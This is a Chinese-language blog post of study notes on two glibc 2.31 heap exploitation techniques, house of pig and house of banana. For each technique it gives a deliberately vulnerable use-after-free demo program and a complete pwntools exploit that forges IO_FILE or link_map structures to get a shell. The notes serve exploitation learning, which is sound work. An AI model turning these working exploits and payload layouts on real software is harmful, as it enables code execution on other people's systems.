---
layout:     post
title:      两种Large bin attack总结
subtitle:   pig and banana
date:       2021-10-31
author:     X1ng
header-img: large.jpg
catalog: true
tags:
    - 学习笔记
    - pwn
---

具体的原理参考资料中大师傅的文章已经写的很清楚了，没有必要抄一遍，所以只记录一下利用的方法

本文测试环境为libc-2.31

### 简介

house of pig和house of banana都是通过large_bin attack（house of pig还需要用到Tcache stashing unlink plus）来向一些结构体指针写入堆地址，从而达到劫持结构体中的指针的目的

### Tcache stashing unlink plus

> 1. tcache中放5个，small_bin中放两个
> 2. 将后进small_bin的chunk的bk(不破坏 fd 指针的情况下)修改为`目标地址-0x10`，同时将`目标地址+0x8`处的值设置为一个指向可写内存的指针
> 3. 从smallbin中取一个chunk，走完stash流程，目标地址就会被链入tcache中

### Large bin attack

> Libc-2.32也可以使用的large_bin attack流程
>
> 1. 整体攻击思路就是申请一大一小两个chunk(后面称为chunk1，chunk2)，先free掉chunk1，然后申请一个更大的chunk来将chunk1从unsortedbin中插入到largebin，接着将chunk1的bk_nextsize设置为target_addr-0x20
> 2. free掉chunk2，然后申请一个更大的chunk来将chunk2从unsortedbin中插入到largebin中，由于此时插入的chunk2的size要小于chunk1，所以会触发攻击流程

### FSOP

libc2.29以后，exit函数中会调用`_IO_flush_all_lockp`来刷新`_IO_list_all` 链表中所有项的文件流，其中存在可能被利用的地方

函数调用链为

```
exit->__run_exit_handlers->_IO_cleanup->_IO_flush_all_lockp
```

在`_IO_flush_all_lockp`函数中，如果`_IO_2_1_stdout_`结构体中偏移0x28处的数据大于偏移0x20处的数据0x1b，则会检查偏移0xd8处是否为`_IO_str_jumps`，相等则跳转其中的`_IO_str_overflow`函数，其中存在malloc、memcpy、free三连调用

完成跳转需要伪造`_IO_list_all` 链表中的IO_FILE结构体，payload如下

```
io  = '\x00'*0x28
io += p64(rdx)
io  = io.ljust(0xD8,'\x00')
io += p64(_IO_str_jumps)
```

具体参考[PWN-ORW总结 - X1ng's Blog](https://x1ng.top/2021/10/28/pwn-orw总结/)

### House of pig

整体思路是使用large_bin attack劫持IO_FILE，tcache stashing unlink plus attack讲free_hook放入tcache中，再利用IO_FILE控制exit中的程序执行流走到`_IO_str_overflow`函数中，利用其中的malloc、memcpy、free三连完成覆盖free_hook并执行`system(/bin/sh);`一把梭

具体思路是在只有calloc的情况下：

1. 第一次利用large_bin attack以`free_hook-8`为目标地址（bk_nextsize覆盖为`free_hook-0x28`）写入一个堆地址用于绕过tcache stashing unlink plus的检查，之后恢复large_bin

    ```
    chunk1(大)->chunk2(小)
    chunk1:p64(chunk2_addr)+p64(main_arena)+p64(chunk2_addr)*2
    chunk2:p64(main_arena)+p64(chunk1_addr)*3
    ```

2. 第二次利用large_bin attack以`_io_list_all`为目标地址写一个堆地址，从而劫持IO_FILE结构体为可控的堆地址，在堆中布置IO_FILE结构体，满足：

    - 0x28偏移处数据大于0x20偏移处数据0x1b

    - 0x38偏移处的数据为保存"/bin/sh\x00"字符串以及system函数地址的堆地址

        ```
        b"/bin/sh\x00"+p64(0)+p64(system)
        ```

    - 0x40偏移处的数据为一个地址，满足

        ```
        2 * ((fp)->_IO_buf_end - (fp)->_IO_buf_base) + 100 == size
        即
        (fp)->_IO_buf_end == (size-100)/2 +(fp)->_IO_buf_base
        ```

        其中`(fp)->_IO_buf_end`为0x40偏移处的数据，`(fp)->_IO_buf_base`为0x38偏移处的数据，size为malloc申请的chunk大小，完成攻击需要让这里的size等于free_hook所在的tcache的size

    - 0xd8偏移处的数据为`_IO_str_jumps`，从而让程序通过check，并调用`_IO_str_jumps`表中的 `IO_str_overflow`

    构造时，由于写入`_io_list_all`的是包括chunk头部的堆地址，所以实际偏移需要减去0x10

    如以下构造tcache大小为0xa0时

    ```python
    pd = p64(0)*3+p64(0x1c)+p64(0)+p64(_IO_buf_base)+p64(_IO_buf_base+26)
    pd = pd.ljust(0xc8,b'\x00')
    pd += p64(_IO_str_jumps)
    ```

    完成后恢复large_bin

    ```
    chunk1(大)->chunk2(小)
    chunk1:p64(chunk2_addr)+p64(main_arena)+p64(chunk2_addr)*2
    chunk2:p64(main_arena)+p64(chunk1_addr)*3
    其中chunk2(小)中就是用来伪造IO_FILE结构体的chunk
    ```

3. 利用tcache stashing unlink plus attack以`free_hook-0x10`为目标地址（bk覆盖为`free_hook-0x20`）当成一个堆地址放入tcache中

4. `IO_str_overflow`函数中存在malloc、memcpy和free三个函数，通过伪造IO_FILE中的内容可以控制malloc的大小和memcpy复制的源地址，从而申请到tcache中`free_hook-0x10`处的chunk，memcpy往该地址写入"/bin/sh\x00"以及覆盖free_hook，下面调用free的时候getshell

#### 例题

写demo来测试

```c
//gcc -o pig pig.c
#include<stdio.h>
#include <unistd.h>
#define MAXIDX 5

void init()
{
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	setbuf(stderr, 0);
}

void menu()
{
	puts("1.add");
	puts("2.edit");
	puts("3.show");
	puts("4.delete");
	puts("5.exit");
	printf("Your choice:");
}

char *list[MAXIDX];
size_t sz[MAXIDX];

int add()
{
	int idx,size;
	printf("Idx:");
	scanf("%d",&idx);
	if(idx<0 || idx>=MAXIDX)
		exit(1);
	printf("Size:");
	scanf("%d",&size);
	if(size<0x80||size>0x500)
		exit(1);
	list[idx] = (char*)calloc(size,1);
	sz[idx] = size;
}

int edit()
{
	int idx;
	printf("Idx:");
	scanf("%d",&idx);
	if(idx<0 || idx>=MAXIDX)
		exit(1);
	puts("context: ");
	read(0,list[idx],sz[idx]);
}

int delete()
{
	int idx;
	printf("Idx:");
	scanf("%d",&idx);
	if(idx<0 || idx>=MAXIDX)
		exit(1);
		
	free(list[idx]);
}

int show()
{
	int idx;
	printf("Idx:");
	scanf("%d",&idx);
	if(idx<0 || idx>=MAXIDX)
		exit(1);
		
	printf("context: ");
	puts(list[idx]);
}


int main()
{
	int choice;
	init();
	while(1){
		menu();
		scanf("%d",&choice);
		if(choice==5){
			return;
		}
		else if(choice==1){
			add();
		}
		else if(choice==2){
			show();
		}
		else if(choice==3){
			edit();
		}
		else if(choice==4){
			delete();
		}
	}
}
```

最基础的UAF模版题，限制了size，构造tcache大小为0xa0进行利用

exp：

```python
#!/usr/bin/python

from pwn import *
import sys
context.log_level = 'debug'
context.arch='amd64'

local=1
binary_name='pig'
libc_name='/lib/x86_64-linux-gnu/libc.so.6'


libc=ELF(libc_name)
e=ELF("./"+binary_name)

if local:
    p=process("./"+binary_name)
else:
    p=remote('',)
    
def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch=='i386'):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b'\x00'))

def cho(choice):
	sla('Your choice:', str(choice))

def add(idx,sz):
	cho(1)
	sla('Idx:', str(idx))
	sla("Size:", str(sz))

def show(idx):
	cho(2)
	sla('Idx:', str(idx))

def edit(idx, com):
	cho(3)
	sla('Idx:', str(idx))
	sla("context: ", com)

def delete(idx):
	cho(4)
	sla('Idx:', str(idx))

	
add(0,0x460)
add(4,0x90)
add(1,0x450)
add(4,0x90)
delete(0)

show(0)
ru('context: ')
libcbase=leak_address()-0x1ebbe0
free_hook=libcbase+libc.sym['__free_hook']
IO_list_all = libcbase + libc.sym['_IO_list_all']
system = libcbase + libc.sym['system']
_IO_str_jumps = libcbase + 0x1ed560
print('[+]libcbase: '+hex(libcbase))
print('[+]free_hook: '+hex(free_hook))
print('[+]system: '+hex(system))
print('[+]_IO_str_jumps: '+hex(_IO_str_jumps))

add(4,0x500)

edit(0,'a'*0xf)
show(0)
ru('aaaaa\n')
heap=leak_address()
print('[+]heap: '+hex(heap))
edit(0,p64(libcbase+0x1ebfe0)*2+p64(heap)+p64(free_hook-8-0x20))
delete(1)
add(4,0x500)



edit(0,p64(heap+0x510)+p64(libcbase+0x1ebfe0)+p64(heap+0x510)+p64(heap+0x510))
edit(1,p64(libcbase+0x1ebfe0)+p64(heap)+p64(heap)+p64(heap))
add(4,0x450)
add(4,0x460)

add(0,0x460)
add(4,0x90)
add(1,0x450)
add(4,0x90)
delete(0)
add(4,0x500)
edit(0,p64(libcbase+0x1ebfe0)+p64(heap+0x1430)*2+p64(IO_list_all-0x20))
print('[+]heap: '+hex(heap))
delete(1)
add(4,0x500)

edit(0,p64(heap+0x1940)+p64(libcbase+0x1ebfe0)+p64(heap+0x1940)+p64(heap+0x1940))
edit(1,p64(libcbase+0x1ebfe0)+p64(heap+0x1430)*3)#fake_io

add(3,0x450)#fake_io/overlap

add(4,0x460)



for i in range(5):
	add(0,0x90)
	delete(0)
for i in range(7):
	add(0,0x200)
	delete(0)
	
add(0,0x200)
add(4,0xa0)
delete(0)
add(4,0x160)

add(1,0x200)
add(4,0xa0)
delete(1)
add(4,0x160)

add(4,0xa0)
edit(1,b'b'*0x168+p64(0xa1)+p64(heap+0x3b60)+p64(free_hook-0x10-0x10))
add(0,0x90)
edit(0,b"/bin/sh\x00"+p64(0)+p64(system))


heap=heap+0x3b70
pd=p64(0)*3+p64(0x1c)+p64(0)+p64(heap)+p64(heap+26)
pd=pd.ljust(0xc8,b'\x00')
pd+=p64(_IO_str_jumps)
edit(3,pd)

cho(5)
ia()
```



### House of banana

该利用方法是由ha1vk师傅发现的，整体思路是使用large_bin attack劫持保存在ld.so里的`_rtld_global`结构体中的数据，修改 `_rtld_global `结构体中的内容来对

```
exit->_dl_fini->_rtld_global结构体中的函数指针
```

的函数调用链中的函数指针进行劫持，其中有多个地方对_rtld_global结构体进行检测，这里参考cat03师傅的方法绕过检测

> 一开始想的是覆盖libc中指向`_rtld_global`结构体的指针，但是由于保存该指针的地址是不可写的，只能直接修改位于ld.so中的`_rtld_global`结构体

其指向的结构体定义如下

```c
struct rtld_global
{
#endif
  /* Don't change the order of the following elements.  'dl_loaded'
     must remain the first element.  Forever.  */

/* Non-shared code has no support for multiple namespaces.  */
#ifdef SHARED
# define DL_NNS 16
#else
# define DL_NNS 1
#endif
  EXTERN struct link_namespaces
  {
    /* A pointer to the map for the main map.  */
    struct link_map *_ns_loaded;
    /* Number of object in the _dl_loaded list.  */
    unsigned int _ns_nloaded;
    /* Direct pointer to the searchlist of the main object.  */
    struct r_scope_elem *_ns_main_searchlist;
    /* This is zero at program start to signal that the global scope map is
       allocated by rtld.  Later it keeps the size of the map.  It might be
       reset if in _dl_close if the last global object is removed.  */
    unsigned int _ns_global_scope_alloc;

    /* During dlopen, this is the number of objects that still need to
       be added to the global scope map.  It has to be taken into
       account when resizing the map, for future map additions after
       recursive dlopen calls from ELF constructors.  */
    unsigned int _ns_global_scope_pending_adds;

    /* Once libc.so has been loaded into the namespace, this points to
       its link map.  */
    struct link_map *libc_map;

    /* Search table for unique objects.  */
    struct unique_sym_table
    {
      __rtld_lock_define_recursive (, lock)
      struct unique_sym
      {
    uint32_t hashval;
    const char *name;
    const ElfW(Sym) *sym;
    const struct link_map *map;
      } *entries;
      size_t size;
      size_t n_elements;
      void (*free) (void *);
    } _ns_unique_sym_table;
    /* Keep track of changes to each namespace' list.  */
    struct r_debug _ns_debug;
  } _dl_ns[DL_NNS];
  /* One higher than index of last used namespace.  */
  EXTERN size_t _dl_nns;
.................................................................................
};
```

在gdb中可以看到其结构内容

```
p _rtld_global
```

该结构体实际在在_dl_fini中被使用

```c
#define DT_FINI_ARRAY 26
#define DT_FINI_ARRAYSZ 28

...
if (l->l_info[DT_FINI_ARRAY] != NULL)
            {
              ElfW(Addr) *array =
                (ElfW(Addr) *) (l->l_addr
                        + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
              unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                        / sizeof (ElfW(Addr)));
              while (i-- > 0)
                ((fini_t) array[i]) ();
            }
...
```

最后调用了array[i]数组中的函数指针，该数组是通过上面两条语句从`l`结构体得到的，其中的`l`则是`_rtld_global`结构体中`struct link_map *_ns_loaded;`

在gdb中查看汇编，调用函数指针的位置为

![gdb](https://tva1.sinaimg.cn/large/008i3skNly1gvyj4bi8ahj30vh0f8jvu.jpg)

`link_map`一个链表结构，`_dl_fini`会依次根据`_ns_loaded`这一链表各个节点的内容组成array[i]，调用其中的函数

而从进入`_dl_fini`执行到此处要经过多重检查

1. 判断`_ns_loaded`链表中至少有三个节点
2. 检查`l == l->l_real`
3. 检查`l->l_init_called > 8 `
4. 检查`l->l_info[DT_FINI_ARRAY] != NULL`

直接将第三个节点的`l_next`指针覆盖为堆地址绕过第一个检查，在堆中伪造第四个节点的内容

需要找到第三个节点的`l_next`指针所在的地址（以`_rtld_global`结构体的地址来计算）

```
pwndbg> distance &_rtld_global &(_rtld_global._dl_ns._ns_loaded->l_next->l_next->l_next)
0x7ffff7ffd060->0x7ffff7fb3018 is -0x4a048 bytes (-0x9409 words)
```

接着只需要通过布置chunk中特定偏移的数据来绕过检查即可

找到`l_real`的偏移伪造数据绕过`l == l->l_real`

```
pwndbg> distance _rtld_global._dl_ns._ns_loaded &_rtld_global._dl_ns._ns_loaded->l_real
0x7ffff7ffe190->0x7ffff7ffe1b8 is 0x28 bytes (0x5 words)
```

找到`l_init_called`的偏移伪造数据绕过`l->l_init_called > 8`

```
pwndbg> distance _rtld_global._dl_ns._ns_loaded &_rtld_global._dl_ns._ns_loaded->l_init_called
0x7ffff7ffe190->0x7ffff7ffe4ac is 0x31c bytes (0x63 words)
```

找到`l_info[26]`和`l_info[28]`的位置伪造数据绕过`l->l_info[DT_FINI_ARRAY] != NULL`的检查，并通过伪造的`d_un`结构体控制`((fini_t) array[i]) ();`中的 array和 i

```
pwndbg> distance _rtld_global._dl_ns._ns_loaded &_rtld_global._dl_ns._ns_loaded->l_info[26]
0x7ffff7ffe190->0x7ffff7ffe2a0 is 0x110 bytes (0x22 words)

pwndbg> distance _rtld_global._dl_ns._ns_loaded &_rtld_global._dl_ns._ns_loaded->l_info[28]
0x7ffff7ffe190->0x7ffff7ffe2b0 is 0x120 bytes (0x24 words)
```

> 需要在`fake+0x110`写入一个ptr，且ptr+0x8处有ptr2，ptr2处写入的是最后要执行的函数地址.
>
> 需要在`fake+0x120`写入一个ptr，且ptr+0x8处是`i*8`。
>
> 我选择的是`fake+0x110`写入`fake+0x40`，在`fake+0x48`写入`fake+0x58`，在`fake+0x58`写入shell
>
> 我选择在`fake+0x120`写入`fake+0x48`，在`fake+0x50`处写入8

构造payload写入chunk伪造结构体：

```python
	pd = b'\x00'*0x18
	pd+= p64(heap)
	pd = pd.ljust(0x38,b'\x00')
	pd+= p64(heap+0x58)
	pd+= p64(8)
	pd+= p64(back_door)
	pd = pd.ljust(0x100,b'\x00')
	pd+= p64(heap+0x40)
	pd = pd.ljust(0x110,b'\x00')
	pd+= p64(heap+0x48)
	pd = pd.ljust(0x30c,b'\x00')
	pd+= p64(0x9)
```

由于写入`_rtld_global._dl_ns._ns_loaded->l_next->l_next->l_next`的是包含堆块头部的堆地址，所以在构造payload的时候要把头部的0x10算进去



#### 例题

还是用上面的demo来测试

```c
//gcc -o banana banana.c
#include<stdio.h>
#include <unistd.h>
#define MAXIDX 5

void init()
{
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	setbuf(stderr, 0);
}

void menu()
{
	puts("1.add");
	puts("2.edit");
	puts("3.show");
	puts("4.delete");
	puts("5.exit");
	printf("Your choice:");
}

char *list[MAXIDX];
size_t sz[MAXIDX];

int add()
{
	int idx,size;
	printf("Idx:");
	scanf("%d",&idx);
	if(idx<0 || idx>=MAXIDX)
		exit(1);
	printf("Size:");
	scanf("%d",&size);
	if(size<0x80||size>0x500)
		exit(1);
	list[idx] = (char*)calloc(size,1);
	sz[idx] = size;
}

int edit()
{
	int idx;
	printf("Idx:");
	scanf("%d",&idx);
	if(idx<0 || idx>=MAXIDX)
		exit(1);
	puts("context: ");
	read(0,list[idx],sz[idx]);
}

int delete()
{
	int idx;
	printf("Idx:");
	scanf("%d",&idx);
	if(idx<0 || idx>=MAXIDX)
		exit(1);
		
	free(list[idx]);
}

int show()
{
	int idx;
	printf("Idx:");
	scanf("%d",&idx);
	if(idx<0 || idx>=MAXIDX)
		exit(1);
		
	printf("context: ");
	puts(list[idx]);
}


int main()
{
	int choice;
	init();
	while(1){
		menu();
		scanf("%d",&choice);
		if(choice==5){
			return;
		}
		else if(choice==1){
			add();
		}
		else if(choice==2){
			show();
		}
		else if(choice==3){
			edit();
		}
		else if(choice==4){
			delete();
		}
	}
}
```

按照上面的思路劫持`_rtld_global`结构体中的成员，从而执行函数

但是似乎并不能控制参数，只能通过one_gadget或者后门函数来获取shell

exp：

```python
#!/usr/bin/python

from pwn import *
import sys
context.log_level = 'debug'
context.arch='amd64'

local=1
binary_name='banana'
libc_name='/lib/x86_64-linux-gnu/libc.so.6'


libc=ELF(libc_name)
e=ELF("./"+binary_name)

if local:
    p=process("./"+binary_name)
else:
    p=remote('',)
    
def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch=='i386'):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b'\x00'))

def cho(choice):
	sla('Your choice:', str(choice))

def add(idx,sz):
	cho(1)
	sla('Idx:', str(idx))
	sla("Size:", str(sz))

def show(idx):
	cho(2)
	sla('Idx:', str(idx))

def edit(idx, com):
	cho(3)
	sla('Idx:', str(idx))
	sla("context: ", com)

def delete(idx):
	cho(4)
	sla('Idx:', str(idx))
	
	
add(0,0x460)
add(4,0x90)
add(1,0x450)
add(4,0x90)
delete(0)
show(0)
ru('context: ')
libcbase=leak_address()-0x1ebbe0
ldbase=libcbase+0x20e000
_rtld_global=ldbase+ld.sym['_rtld_global']
IO_list_all = libcbase + libc.sym['_IO_list_all']
system = libcbase + libc.sym['system']
print('[+]libcbase: '+hex(libcbase))
print('[+]_rtld_global: '+hex(_rtld_global))
print('[+]system: '+hex(system))

	
add(4,0x500)	
edit(0,'a'*0xf)
show(0)
ru('aaaaa\n')
heap=leak_address()
print('[+]heap: '+hex(heap))

node=_rtld_global-0x4a048
edit(0,p64(libcbase+0x1ebfe0)*2+p64(heap)+p64(node-0x20))
delete(1)

add(4,0x500)
	
	
edit(0,p64(heap+0x510)+p64(libcbase+0x1ebfe0)+p64(heap+0x510)+p64(heap+0x510))
edit(1,p64(libcbase+0x1ebfe0)+p64(heap)+p64(heap)+p64(heap))
add(0,0x450)#fake_l

add(4,0x460)
	
one=[0xe6c7e,0xe6c81,0xe6c84]

pd = b'\x00'*0x18
pd+= p64(heap+0x510)
pd = pd.ljust(0x38,b'\x00')
pd+= p64(heap+0x510+0x58)
pd+= p64(8)
pd+= p64(libcbase+one[0])
pd = pd.ljust(0x100,b'\x00')
pd+= p64(heap+0x510+0x40)
pd = pd.ljust(0x110,b'\x00')
pd+= p64(heap+0x510+0x48)
pd = pd.ljust(0x30c,b'\x00')
pd+= p64(0x9)
	
edit(0,pd)
cho(5)


ia()
```





> [[原创\]house of pig详解-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-268245.htm#msg_header_h2_0)
>
> [house of banana - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/222948#h3-6)
>
> [house_of_banana源码分析 | Blog of cat03 (giles-one.github.io)](https://giles-one.github.io/2021/10/04/house-of-系列源码分析/)
